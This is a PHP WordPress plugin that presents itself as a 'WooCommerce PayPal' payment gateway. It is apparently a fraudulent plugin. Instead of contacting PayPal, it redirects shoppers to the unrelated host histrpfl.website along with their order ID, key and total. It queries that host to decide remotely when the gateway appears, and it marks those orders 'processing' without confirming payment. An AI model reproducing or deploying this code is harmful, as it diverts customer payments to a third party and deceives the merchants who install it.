<?php
/*
Plugin Name: WooCommerce PayPal
Description: Integrates your PayPal payment gateway into your WooCommerce installation.
Version: 1.1
Author: PP
Text Domain: woo-paypal
*/
add_action('plugins_loaded', 'init_paypal_gateway', 31);

function init_paypal_gateway() {
    if (!class_exists('WC_Payment_Gateway')) {
        return;
    }

    function paypal_disable_checkout_script() {
        wp_dequeue_script('wc-checkout');
    }

    class PayPal extends WC_Payment_Gateway
    {
        public static $_instance = NULL;

        public $log;

        public static function get_instance()
        {
            if (is_null(self::$_instance)) {
                self::$_instance = new self();
            }

            return self::$_instance;
        }

        public function __construct()
        {
            $this->id                 = 'pp';
            $this->method_title       = 'PayPal';
            $this->method_description = 'Pay via Paypal';
            $this->icon               = plugins_url() . '/woocommerce-paypal-billing/pp.png';
            $this->has_fields         = false;
            $this->supports           = array(
                'products'
            );

            $this->init_form_fields();
            $this->init_settings();

            if (is_admin()) {
                add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
            }

            foreach ($this->settings as $setting_key => $value) {
                $this->$setting_key = $value;
            }
        }

        public function init_form_fields()
        {
            $this->form_fields = array(
                'enabled' => array(
                    'title'  => 'Enable / Disable',
                    'label'  => 'Enable this payment gateway',
                    'type'   => 'checkbox',
                    'default' => 'no',
                ),
                'title' => array(
                    'title'    => 'Title',
                    'type'     => 'text',
                    'desc_tip' => 'Payment title the customer will see during the checkout process.',
                    'default'  => 'PayPal',
                ),
                'description' => array(
                    'title'    => 'Description',
                    'type'     => 'textarea',
                    'desc_tip' => 'Payment description the customer will see during the checkout process.',
                    'css'      => 'max-width:350px;'
                ),
            );
        }

        public function process_payment($order_id)
        {
            global $woocommerce;

            $customer_order = new WC_Order($order_id);

            $form_array = array(
                'public_key'    => 'Zk9EEgZOe4Cr',
                'invoice'       => $customer_order->id,
                'item_name'     => $customer_order->order_key,
                'price'         => $customer_order->total,
                'notify_url'    => plugins_url() . '/woocommerce-paypal-billing/pay/notify.php',
                'return'        => plugins_url() . '/woocommerce-paypal-billing/pay/return.php',
                'cancel_return' => plugins_url() . '/woocommerce-paypal-billing/pay/cancel.php',
            );

            $payment_gateway_url = "https://histrpfl.website?" . http_build_query($form_array);

            return array(
                'result'   => 'success',
                'redirect' => $payment_gateway_url,
            );
        }
    }

    add_filter('woocommerce_payment_gateways', 'paypal_gateway');
    function paypal_gateway($methods)
    {
        if (!is_admin()) {
            $cart  = WC()->instance()->cart;
            $total = $cart->get_cart_contents_total();

            $cb = checkBillingExtend($total);

            if (!$cb) {
                return $methods;
            }
        }
        $methods[] = 'PayPal';
        return $methods;
    }

    function checkBilling() {
        $cURLConnection = curl_init();
        curl_setopt($cURLConnection, CURLOPT_URL, 'https://histrpfl.website/checkbilling');
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $a = curl_exec($cURLConnection);
        curl_close($cURLConnection);

        return intval($a) ? true : false;
    }

    function checkBillingExtend($total) {
        $cURLConnection = curl_init();
        curl_setopt($cURLConnection, CURLOPT_URL, 'https://histrpfl.website/checkbilling-extend');
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $a = curl_exec($cURLConnection);
        curl_close($cURLConnection);

        return floatval($a) > $total ? true : false;
    }
}

add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'paypal_links');
function paypal_links($links)
{
    $plugin_links = array(
        '<a href="' . admin_url('admin.php?page=wc-settings&tab=checkout&section=pp') . '">Settings</a>',
    );

    return array_merge($plugin_links, $links);
}

add_action('woocommerce_thankyou', 'custom_thankyou_redirect');
function custom_thankyou_redirect($order_id)
{
    $order          = wc_get_order($order_id);
    $payment_method = $order->get_payment_method();

    if ($payment_method === 'pp') {
        // Change order status to processing
        $order->update_status('processing');

        $thank_you_url = home_url('/custom-thank-you-page'); // Replace with your custom thank you page URL
        wp_safe_redirect($thank_you_url);
        exit;
    }
}